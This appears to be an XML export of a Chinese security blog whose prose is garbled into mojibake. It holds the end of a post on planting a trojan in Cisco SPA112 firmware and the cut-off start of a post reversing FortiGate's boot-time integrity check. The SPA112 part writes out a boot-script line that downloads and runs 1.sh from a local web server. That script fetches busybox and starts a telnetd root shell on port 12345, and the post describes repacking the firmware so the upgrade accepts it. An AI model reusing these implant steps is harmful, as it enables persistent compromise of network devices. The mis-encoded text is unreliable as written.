<p>å¹¸è¿çš„æ˜¯ Cisco <a class="link"   href="https://www.cisco.com/web/fw/opensource/64846727/payton_1.3.5.001_gpl-28.tar.gz" >å®˜ç½‘<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ä¸Šä¿ç•™äº†è¯¥è®¾å¤‡çš„ GPL ä»£ç åŒ…ï¼Œå…¶ä¸­å°±åŒ…å«ä¿®æ”¹è¿‡çš„ sqfs å·¥å…·ã€‚æˆ‘ä»¬ä¸‹è½½è¿™å¥—ä»£ç ï¼Œå°†å…¶ä¸­çš„ squashfs ç›¸å…³å·¥å…·ç¼–è¯‘å‡ºæ¥ï¼Œä½¿ç”¨è¿™äº›å·¥å…·å³å¯æ­£å¸¸å¯¹æ–‡ä»¶è¿›è¡Œè§£åŒ…(binwalk å¯ä»¥æ­£å¸¸è§£åŒ…ï¼Œåº”è¯¥æ˜¯ binwalk å†…éƒ¨è¿›è¡Œäº†ç‰¹æ®Šæ”¯æŒ)ã€‚</p>
<p>è§£åŒ…åéœ€è¦æ‰¾åˆ°ä¸€ä¸ªä½ç½®æ¤å…¥æœ¨é©¬æ–‡ä»¶ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šå¯»æ‰¾ä¸€äº›å¼€æœºè‡ªå¯åŠ¨çš„è„šæœ¬ï¼Œåœ¨å…¶ä¸­æ·»åŠ æ‰§è¡Œæœ¨é©¬çš„å‘½ä»¤ã€‚åœ¨è¿™ä¸ªç³»ç»Ÿä¸­ï¼Œå¯ä»¥ä¿®æ”¹ &#x2F;etc&#x2F;rc.init.1 æ–‡ä»¶ï¼Œç³»ç»Ÿå¯åŠ¨åä¼šè‡ªåŠ¨æ‰§è¡Œã€‚</p>
<p>ä¿®æ”¹ä¹‹åçš„æ ·ä¾‹ï¼š</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># /etc/rc.init.1 , should create necessary directory and load the driver</span></span><br><span class="line"><span class="comment"># please don&#x27;t access nvram here, or modfiy any other env variable code here</span></span><br><span class="line"><span class="comment"># - by wenij</span></span><br><span class="line">$(/bin/sleep 60 &amp;&amp; /bin/busybox wget -O /tmp/1.sh http://192.168.0.124:8000/1.sh &amp;&amp; /bin/busybox <span class="built_in">chmod</span> 777 /tmp/1.sh &amp;&amp; /tmp/1.sh) &amp;</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="string">&quot;/var/tmp/events&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">mkdir</span> /var/tmp/events</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>

<p>ä¿®æ”¹å®Œæˆï¼Œä½¿ç”¨ä¹‹å‰ç¼–è¯‘çš„ mksquashfs é‡æ–°æ‰“åŒ…ï¼Œç¡®ä¿æ‰“åŒ…ä¹‹åçš„æ–‡ä»¶ä¸å¤§äºåŸå§‹æ–‡ä»¶ï¼Œç„¶åæ‹¼æ¥å›åŸæ¥çš„å›ºä»¶æœ«å°¾ï¼Œè¡¥é½è‡³åŸå§‹é•¿åº¦ã€‚</p>
<p>ç°åœ¨ï¼Œå¦‚æœå°†è¿™ä¸ªé‡æ–°æ‰“åŒ…å¥½çš„å›ºä»¶åˆ·å…¥è®¾å¤‡ï¼Œé‡å¯ä¹‹åå°†ä¼šè¿›å…¥ â€œæ•‘æ´æ¨¡å¼â€ï¼Œæç¤ºä¹‹å‰ä¼ å…¥çš„å›ºä»¶æ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œè¯·é‡æ–°åˆ·å†™ã€‚</p>
<p>å› æ­¤é™¤äº†ç®€å•ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è°ƒæ•´å›ºä»¶ä¸­çš„å…¶ä»–ç»“æ„ï¼Œä»¥æ»¡è¶³å‡çº§é€»è¾‘ã€‚ç»§ç»­åˆ†æ upgrade.cgiï¼Œåœ¨å‡½æ•°å¼€å¤´éƒ¨åˆ†ä¼šæ‰§è¡Œä¸€äº›å‘½ä»¤</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v100 = dword_623C8;</span><br><span class="line">system(<span class="string">&quot;cp /usr/sbin/splitfmwr /tmp/splitfmwr&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( a1 )</span><br><span class="line">&#123;</span><br><span class="line">  v116[<span class="number">0</span>] = <span class="string">&quot;/tmp/splitfmwr&quot;</span>;</span><br><span class="line">  v116[<span class="number">1</span>] = <span class="string">&quot;-u&quot;</span>;</span><br><span class="line">  v116[<span class="number">2</span>] = <span class="string">&quot;/home/usb_disk/pb_usb_drive.tgz&quot;</span>;</span><br><span class="line">  v116[<span class="number">3</span>] = <span class="string">&quot;-p&quot;</span>;</span><br><span class="line">  v116[<span class="number">4</span>] = <span class="string">&quot;/tmp/pfmwr.img&quot;</span>;</span><br><span class="line">  v116[<span class="number">5</span>] = <span class="string">&quot;-b&quot;</span>;</span><br><span class="line">  v116[<span class="number">6</span>] = <span class="string">&quot;/tmp/bootldr.img&quot;</span>;</span><br><span class="line">  v116[<span class="number">7</span>] = <span class="string">&quot;-s&quot;</span>;</span><br><span class="line">  v116[<span class="number">8</span>] = <span class="string">&quot;/tmp/sfmwr.img&quot;</span>;</span><br><span class="line">  v116[<span class="number">9</span>] = <span class="string">&quot;-h&quot;</span>;</span><br><span class="line">  v116[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">  v116[<span class="number">10</span>] = <span class="string">&quot;/tmp/SPA_HS.img&quot;</span>;</span><br><span class="line">  v116[<span class="number">11</span>] = a1;</span><br><span class="line">  v10 = eval(v116, <span class="string">&quot;&gt;/dev/console&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v12 = v10;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = &amp;v107;</span><br><span class="line">    v12 = <span class="number">-9</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v127 = v10;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(v11 + <span class="number">281</span>) = v12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v118[<span class="number">0</span>] = <span class="string">&quot;/tmp/write&quot;</span>;</span><br><span class="line">    v118[<span class="number">1</span>] = <span class="string">&quot;/tmp/pfmwr.img&quot;</span>;</span><br><span class="line">    v118[<span class="number">2</span>] = <span class="string">&quot;ROMIMAGE&quot;</span>;</span><br><span class="line">    v118[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    v10 = eval(v118, <span class="string">&quot;&gt;/dev/console&quot;</span>, v12, v12);</span><br><span class="line">    v127 = v10;</span><br><span class="line">  &#125;</span><br><span class="line">  libupg_release_upglock(v10);</span><br><span class="line">  <span class="keyword">return</span> v127;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ ¹æ®åç§°æ¥çŒœæµ‹ï¼Œsplitfmwr ç¨‹åºåˆ‡å‰²å›ºä»¶ï¼Œå°†å…¶åˆ†ä¸º n ä¸ªéƒ¨åˆ†ï¼Œè€Œ write ç¨‹åºæ‰§è¡Œå®é™…çš„å†™å…¥é—ªå­˜æ“ä½œã€‚</p>
<p>é‚£ä¹ˆä¸»è¦çš„å›ºä»¶éªŒè¯é€»è¾‘åº”è¯¥å°±ä½äº splitfmwr ç¨‹åºä¸­ï¼Œè¿™ä¸ªç¨‹åºæ¯”è¾ƒå¤æ‚ï¼Œå®ƒä¼šæ ¹æ®å›ºä»¶å¤´éƒ¨å°è¯•å°†å›ºä»¶åˆ‡å‰²ï¼Œå¯¹äºæ­£å¸¸çš„å›ºä»¶ï¼Œç†è®ºä¸Šä¼šåˆ‡å‰²å‡º bootloaderã€å†…æ ¸ã€æ–‡ä»¶ç³»ç»Ÿç­‰ã€‚è¿™äº›ä¸åŒçš„éƒ¨åˆ†ç§°ä¹‹ä¸º moduleï¼Œå¤šä¸ª module ç»„æˆäº†ä¸€ä¸ª packï¼Œå›ºä»¶å¤´éƒ¨åŒ…å« n ä¸ª MD5 å€¼ï¼Œç”¨äºæ ¡éªŒå›ºä»¶ä¸­çš„å„ä¸ªç»„æˆéƒ¨åˆ†ã€‚</p>
<p>å¯¹äºè¿™äº›ç»“æ„æˆ‘ä»¬å¯ä»¥å°è¯•é€æ­¥åˆ†æï¼Œç›´åˆ°å†™å‡ºä¸€ä¸ªå¯ç”¨çš„æ‰“åŒ…ç¨‹åºã€‚ä¸è¿‡åœ¨æŸ¥çœ‹ GPL ä»£ç æ—¶ï¼Œå‘ç°å…¶ä¸­åŒ…å«ä¸¤ä¸ªé¡¹ç›®ï¼špkger å’Œ modulerï¼Œå®ƒä»¬æ­£æ˜¯ç”¨äºæ‰“åŒ… SPA112 å›ºä»¶çš„å·¥å…·ã€‚å°†è¿™ä¸¤ä¸ªå·¥å…·ç¼–è¯‘å‡ºæ¥ï¼Œåœ¨åŸå§‹å›ºä»¶ä¸Šèƒ½å¤Ÿæ­£å¸¸è§£æ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">âœ  repack ./tools/pkger -r ./ori.bin         </span><br><span class="line">Firmware version:     1.4.1</span><br><span class="line">Firmware modules:     1</span><br><span class="line">Firmware length:      10092936</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·ï¼Œå¯ä»¥èŠ‚çœæˆ‘ä»¬å¾ˆå¤šç²¾åŠ›ï¼Œå‚è€ƒ GPL ä¸­çš„æ‰“åŒ…è„šæœ¬ç»“åˆå„ä¸ªå·¥å…·ï¼Œå¯å¿«é€Ÿåˆ¶ä½œå‡ºç¬¦åˆå‡çº§è¦æ±‚çš„å›ºä»¶ã€‚</p>
<p>åœ¨æœ¬åœ°æ„é€  1.shï¼Œå¹¶å‡†å¤‡å¥½ busybox ç¨‹åºï¼Œå¼€å¯ python web æœåŠ¡</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">/bin/busybox wget -O /tmp/busybox http://192.168.0.124:8000/busybox</span><br><span class="line">/bin/busybox <span class="built_in">chmod</span> 777 /tmp/busybox</span><br><span class="line">/tmp/busybox telnetd -l/bin/sh -p12345</span><br></pre></td></tr></table></figure></div>

<p>å°†æ„é€ å¥½çš„å›ºä»¶åˆ·å…¥è®¾å¤‡ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/spa112-1.png"
                     
                ></p>
<p>å‡çº§å®Œæˆå‡ºç°ä»¥ä¸‹ç”»é¢ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/spa112-2.png"
                     
                ></p>
<p>ç­‰å¾…è®¾å¤‡é‡æ–°å¯åŠ¨ï¼Œå¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œåœ¨ python æœåŠ¡å™¨ç«¯å¯ä»¥æ”¶åˆ°ä¸‹è½½æ–‡ä»¶çš„è¯·æ±‚ï¼Œä¹‹åè¿æ¥è®¾å¤‡çš„ 12345 ç«¯å£å³å¯å¾—åˆ° shellï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/spa112-3.png"
                     
                ></p>
<p>æœ¬æ–‡æˆ‘ä»¬ç®€å•åˆ†æäº† Cisco SPA112 è¯­éŸ³ç½‘å…³çš„æ¼æ´ï¼Œå°è¯•ä½¿ç”¨å‚å•†å¼€æºçš„ GPL å·¥å…·æ„é€ æ¶æ„å›ºä»¶ï¼Œæ¤å…¥æœ¨é©¬åè·å–ä»£ç æ‰§è¡Œæƒé™ã€‚<a class="link"   href="https://github.com/rrrrrrri/spa112-tools" >ç›¸å…³å·¥å…·<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>æ­å»º FortiGate è°ƒè¯•ç¯å¢ƒ (ä¸€)</title>
    <url>/2023/03/02/fortigate_debug_env1/</url>
    <content><![CDATA[<p>å…³äºå¦‚ä½•è·å– FortiGate shell æƒé™ä»¥åŠå¦‚ä½•å®Œæˆ License æˆæƒéªŒè¯ã€‚(ä¸€)</p>
<span id="more"></span>

<h2 id="å¤„ç†åˆ¤æ–­é€»è¾‘"><a href="#å¤„ç†åˆ¤æ–­é€»è¾‘" class="headerlink" title="å¤„ç†åˆ¤æ–­é€»è¾‘"></a>å¤„ç†åˆ¤æ–­é€»è¾‘</h2><p>æœ¬åšå®¢æŸå†å²æ–‡ç« ä¸­æåˆ°è¿‡ä¸€ç¯‡<a class="link"   href="https://www.cnblogs.com/studyskill/p/6524672.html" >å‚è€ƒèµ„æ–™<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œä¸è¿‡è¿™ç¯‡èµ„æ–™æ˜¯é’ˆå¯¹æ—§ç‰ˆæœ¬ FortiGate çš„ï¼ŒFortinet æ›¾åœ¨ 2019 å¹´ 11 æœˆ 14 æ—¥å‘å¸ƒäº†ä¸€ä¸ªå½±å“ FortiGate çš„ <a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-19-017" >CVE<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œåœ¨è¿™ä¸ªæ¼æ´çš„æè¿°ä¸­ï¼Œå®˜æ–¹è®¤ä¸º VM åº”ç”¨ç¼ºå°‘å¯¹æ–‡ä»¶ç³»ç»Ÿçš„æ£€æŸ¥ï¼Œå¯èƒ½å¯¼è‡´æ”»å‡»è€…å‘ç³»ç»Ÿä¸­æ³¨å…¥æ¶æ„ç¨‹åºã€‚ä¸ºæ­¤åœ¨å¯åŠ¨æµç¨‹ä¸­æ·»åŠ äº†æ–‡ä»¶ç³»ç»Ÿæ ¡éªŒï¼ŒæŒ‰ç…§å‚è€ƒèµ„æ–™çš„æ­¥éª¤ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶ä¹‹åå¯èƒ½ä¼šå¯¼è‡´æ— æ³•å¯åŠ¨æˆ–è€…æ— é™é‡å¯ã€‚</p>
<p>å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆæƒ³åˆ°çš„æ˜¯å®šä½æ£€æŸ¥é€»è¾‘ï¼Œçœ‹çœ‹èƒ½å¦æ ¹æ®ç®—æ³•æ‰“åŒ…å‡ºæ­£ç¡®çš„æ–‡ä»¶æˆ–è€…ç›´æ¥å°†æ£€æŸ¥é€»è¾‘ patch æ‰ã€‚å…ˆçœ‹ä¸€ä¸‹ç³»ç»Ÿå¯åŠ¨æ—¶çš„è¾“å‡ºä¿¡æ¯ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_1.png"
                     
                ></p>
<p>è€ƒè™‘æ–‡ä»¶ç³»ç»Ÿçš„æ ¡éªŒå¯èƒ½æ˜¯åœ¨å†…æ ¸æˆ–è€…ç”¨æˆ·æ€å®ç°ï¼Œæˆ‘ä»¬é¦–å…ˆåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­å°è¯•æœç´¢ System is starting å­—ç¬¦ä¸²</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_2.png"
                     
                ></p>
<p>åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ bin&#x2F;init ä¸­æ‰¾åˆ°äº†åŒ¹é…ï¼Œé€†å‘è¯¥æ–‡ä»¶çœ‹çœ‹è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯ä½•æ—¶æ‰“å°çš„ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  t_printf(<span class="string">&quot;\nSystem is starting...\n&quot;</span>, v11, v8, v12, v5, v6, requested_time.tv_sec);<span class="comment">// æ‰“å°å­—ç¬¦ä¸²</span></span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  sub_206FB40();</span><br><span class="line">  reboot(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  sub_44DE80(<span class="number">0</span>);</span><br><span class="line">  chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  setsid();</span><br><span class="line">  v14 = sub_44DDF0(<span class="string">&quot;/dev/null&quot;</span>);</span><br><span class="line">  v15 = v14;</span><br><span class="line">  <span class="keyword">if</span> ( v14 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dup2(v14, <span class="number">0</span>);</span><br><span class="line">    dup2(v15, <span class="number">1</span>);</span><br><span class="line">    dup2(v15, <span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_290E8D0(<span class="number">1024LL</span>, <span class="number">1LL</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    t_printf(<span class="string">&quot;could not setup epoll in init.\n&quot;</span>, <span class="number">1</span>, v16, v17, v18, v19, requested_time.tv_sec);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_452C00() &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_450A80();</span><br><span class="line">    sub_1F6CD90(<span class="number">16</span>, <span class="string">&quot;%s()-%d: %s: run_initlevel(SYSINIT)\n\n&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">2649</span>, <span class="string">&quot;main&quot;</span>, v20, requested_time.tv_sec);</span><br><span class="line">    sub_44E2D0(<span class="number">1LL</span>);</span><br><span class="line">    sub_451670();</span><br><span class="line">    sub_450BC0();</span><br><span class="line">    <span class="keyword">if</span> ( sub_44F240() )</span><br><span class="line">      do_halt();</span><br><span class="line">    <span class="keyword">if</span> ( !sub_44F1A0() )</span><br><span class="line">      do_halt();</span><br><span class="line">    <span class="keyword">if</span> ( sub_2745D50() )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_2825E00();</span><br><span class="line">      <span class="keyword">if</span> ( sub_44DFC0(<span class="string">&quot;/bin/fips_self_test&quot;</span>) )</span><br><span class="line">        do_halt();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sub_44F1F0() )</span><br><span class="line">        do_halt();</span><br><span class="line">      sub_2781560();</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬çœ‹åˆ°åœ¨ init ç¨‹åºçš„ main å‡½æ•°ä¸­ç¬¬ 82 è¡Œä½ç½®æ‰“å°äº†æ­¤å­—ç¬¦ä¸²ï¼Œè€Œå‘ä¸‹åˆ†æå‘ç°æœ‰å‡ å¤„åˆ¤æ–­ï¼Œå…¶ä¸­æ¯”è¾ƒæ˜æ˜¾çš„ä½ç½®å¼•ç”¨äº† &#x2F;bin&#x2F;fips_self_test å­—ç¬¦ä¸²ã€‚do_halt å‡½æ•°çš„å†…å®¹ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">do_halt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  FILE *v1; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// er12</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">requested_time</span>;</span> <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_451FA0(<span class="string">&quot;do_halt&quot;</span>, <span class="number">1388</span>);</span><br><span class="line">  v0 = fopen(<span class="string">&quot;/etc/shutdown.dat&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v0;</span><br><span class="line">    <span class="built_in">fprintf</span>(v0, <span class="string">&quot;%d&quot;</span>, <span class="number">1LL</span>);</span><br><span class="line">    fclose(v1);</span><br><span class="line">    sync();</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_44EF50();</span><br><span class="line">  v2 = open(<span class="string">&quot;/dev/console&quot;</span>, <span class="number">2305</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dprintf(v2, <span class="string">&quot;\r\nThe system is halted.\r\n&quot;</span>);</span><br><span class="line">    fsync(v3);</span><br><span class="line">    close(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  requested_time.tv_sec = <span class="number">2LL</span>;</span><br><span class="line">  requested_time.tv_nsec = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( nanosleep(&amp;requested_time, &amp;requested_time) == <span class="number">-1</span> &amp;&amp; *__errno_location() == <span class="number">4</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( !fork() )</span><br><span class="line">    reboot(<span class="number">1126301404</span>);</span><br><span class="line">  <span class="keyword">while</span> ( pause() )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œä¼šè¾“å‡ºä¿¡æ¯ The system is haltedï¼Œè¡¨ç¤ºç³»ç»Ÿå·²åœæ­¢è¿è¡Œã€‚</p>
<p>ç¬¬ä¸€ä¸ªåˆ¤æ–­å‡½æ•°å†…éƒ¨æ‰§è¡Œäº† ioctl å’Œ socket ç­‰å‡½æ•°ï¼Œå‘å†…æ ¸å‘é€æˆ–æ¥æ”¶æŸäº›ä¿¡æ¯</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_2907930</span><span class="params">(<span class="type">int</span> a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// er13</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// er12</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_468D350 &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> ioctl(dword_468D350, a1, a2);</span><br><span class="line">  v2 = socket(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v4 = ioctl(v2, a1, a2);</span><br><span class="line">  close(v3);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬äºŒä¸ªå‡½æ•° fork å‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œä¸»è¦å¤„ç†é€»è¾‘ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 <span class="title function_">sub_447D40</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// dl</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// dl</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  FILE *v6; <span class="comment">// rax</span></span><br><span class="line">  FILE *v7; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  FILE *v9; <span class="comment">// r13</span></span><br><span class="line">  _BOOL8 v10; <span class="comment">// r12</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// r15</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">void</span> *v15; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">void</span> *v16; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">size_t</span> v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+0h] [rbp-F0h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">void</span> *v21; <span class="comment">// [rsp+10h] [rbp-E0h]</span></span><br><span class="line">  __int64 *v22; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">void</span> *v23; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+28h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">char</span> v25[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> filename[<span class="number">8</span>]; <span class="comment">// [rsp+50h] [rbp-A0h] BYREF</span></span><br><span class="line">  __int16 v27; <span class="comment">// [rsp+58h] [rbp-98h]</span></span><br><span class="line">  __int64 ptr[<span class="number">16</span>]; <span class="comment">// [rsp+70h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">97</span>;</span><br><span class="line">  v1 = <span class="number">78</span>;</span><br><span class="line">  ptr[<span class="number">9</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *filename = <span class="number">0x42F1C441217474E</span>LL;</span><br><span class="line">  <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;aiqu0oZi&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; v0 = *(ptr + i) )</span><br><span class="line">  &#123;</span><br><span class="line">    v25[i++] = v0 ^ v1;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = filename[i];</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">97</span>;</span><br><span class="line">  v4 = <span class="number">78</span>;</span><br><span class="line">  v24 = <span class="number">0x42F1C441217474E</span>LL;</span><br><span class="line">  <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;aiqu0oZi&quot;</span>);</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v25[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    filename[v5++] = v3 ^ v4;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = *(&amp;v24 + v5);</span><br><span class="line">    v3 = *(ptr + v5);</span><br><span class="line">  &#125;</span><br><span class="line">  v27 = <span class="number">50</span>;</span><br><span class="line">  v6 = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  v7 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &amp;&amp; (v8 = fread(ptr, <span class="number">1uLL</span>, <span class="number">0x40</span>uLL, v6), fclose(v7), v8 &gt; <span class="number">0</span>) &amp;&amp; (v9 = fopen(v25, <span class="string">&quot;r&quot;</span>)) != <span class="number">0LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v10) = <span class="number">0</span>;</span><br><span class="line">    v23 = &amp;unk_3FAC280;</span><br><span class="line">    v11 = d2i_PUBKEY(<span class="number">0LL</span>, &amp;v23, <span class="number">294LL</span>);</span><br><span class="line">    v12 = v11;</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = EVP_PKEY_get1_RSA(v11);</span><br><span class="line">      v14 = v13;</span><br><span class="line">      <span class="keyword">if</span> ( v13 )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = &amp;v19;</span><br><span class="line">        n = RSA_size(v13);</span><br><span class="line">        v15 = alloca(n);</span><br><span class="line">        v21 = &amp;v19;</span><br><span class="line">        v16 = alloca(RSA_size(v14));</span><br><span class="line">        v17 = fread(v21, <span class="number">1uLL</span>, n, v9);</span><br><span class="line">        <span 